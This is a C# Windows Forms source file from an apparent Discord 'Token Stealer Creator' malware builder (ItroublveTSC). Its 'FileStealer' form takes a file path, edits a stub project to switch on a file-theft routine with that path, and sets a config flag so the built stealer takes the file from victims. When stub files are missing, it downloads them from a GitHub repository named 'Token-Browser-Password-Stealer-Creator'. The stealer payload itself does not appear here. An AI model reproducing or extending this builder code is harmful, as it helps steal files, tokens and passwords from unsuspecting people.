using DiscordFlooder.Class.Design.Rainbow;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ItroublveTSC
{
    public partial class FileStealer : Form
    {
        #region GUI
        public FileStealer()
        {
            InitializeComponent();
            RainbowTimer.Start();
        }

        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void HomeBtn_Click(object sender, EventArgs e)
        {
            var frmMain2 = Application.OpenForms.OfType<frmMain>().FirstOrDefault();
            if (frmMain2 == null)
            {
                frmMain2 = new frmMain();
            }
            frmMain2.Location = Location;
            frmMain2.StartPosition = FormStartPosition.Manual;
            frmMain2.Show();
            Hide();
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TokenStealerCOPY.bin"))
            {
                File.Delete("TokenStealerCOPY.bin");
            }
            if (Directory.Exists(Path.GetTempPath() + "bin_copy"))
            {
                Directory.Delete(Path.GetTempPath() + "bin_copy", true);
            }
            File.Delete(Path.GetTempPath() + "convertedicon.ico");
            Environment.Exit(0);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void HeadLinePnlInf_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadLinePnlInf_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var advanced = Application.OpenForms.OfType<Advanced>().FirstOrDefault();
            if (advanced == null)
            {
                advanced = new Advanced();
            }
            advanced.Location = Location;
            advanced.StartPosition = FormStartPosition.Manual;
            advanced.Show();
            Hide();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var filesize = Application.OpenForms.OfType<FileSize>().FirstOrDefault();
            if (filesize == null)
            {
                filesize = new FileSize();
            }
            filesize.Show();
            Hide();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            var credits = Application.OpenForms.OfType<Credits>().FirstOrDefault();
            if (credits == null)
            {
                credits = new Credits();
            }
            credits.Location = Location;
            credits.StartPosition = FormStartPosition.Manual;
            credits.Show();
            Hide();
        }
            #region Textbox placeholders
        private void FileStealerTxt_Leave(object sender, EventArgs e)
        {
            if (FileStealerTxt.Text == "")
            {
                FileStealerTxt.Text = "Enter File Path";
            }
        }

        private void FileStealerTxt_Enter(object sender, EventArgs e)
        {
            if (FileStealerTxt.Text == "Enter File Path")
            {
                FileStealerTxt.Text = "";
            }
        }
        #endregion
        #endregion
        #region Save to bin_copy
        private void CreateTokenStealerBtn_Click(object sender, EventArgs e)
        {
            bool flag = FileStealerTxt.Text == "" || FileStealerTxt.Text == "Enter File Path";
            if (flag) 
            {
                MessageBox.Show("You need to enter file path first!", "ItroublveTSC");
                return; 
            }
            try
            {
                string path = Path.GetTempPath() + @"bin_copy";
                if (!Directory.Exists(path))
                {
                    string test = @"bin";
                    frmMain.Copy(test, path);
                }
                string hi = File.ReadAllText(path + "\\Program.cs");
                string text = File.ReadAllText(path + "\\Digitallity.cs");
                string config = File.ReadAllText(path + "\\Binaries\\config");
                hi = hi.Replace("//Digitallity.Digitallify();", "Digitallity.Digitallify();");
                text = text.Replace("//", "");
                text = text.Replace("omg", FileStealerTxt.Text);
                config = config.Replace("\"files\": false", "\"files\": true");
                File.WriteAllText(path + "\\Program.cs", hi);
                File.WriteAllText(path + "\\Digitallity.cs", text);
                File.WriteAllText(path + "\\Binaries\\config", config);
                WinInfo.Visible = true;
                WinInfo.BalloonTipText = "Path added :D";
                WinInfo.ShowBalloonTip(1000);
            }
            catch (Exception ex)
            {
                if (!Directory.Exists(Application.StartupPath + "\\bin"))
                {
                    Directory.Delete(Path.GetTempPath() + "bin_copy", true);
                    DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        string _cdDir = Path.GetDirectoryName(Application.ExecutablePath);
                        DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/6.0/AVOID%20ME/bin.zip", "Token Stealer Creator.zip");
                        ZipFile.ExtractToDirectory(_cdDir + "\\Token Stealer Creator.zip", _cdDir);
                        File.Delete(_cdDir + "\\Token Stealer Creator.zip");
                        MessageBox.Show("Successfully downloaded and installed\nYou can continue now!", "ItroublveTSC");
                        return;
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        MessageBox.Show("OK. FINE THEN. DO WHATEVER YOU WANT . -.", "ItroublveTSC");
                        return;
                    }
                }
                else 
                    MessageBox.Show(ex.Message, "ItroublveTSC");
            }
        }
        #endregion
    }
}
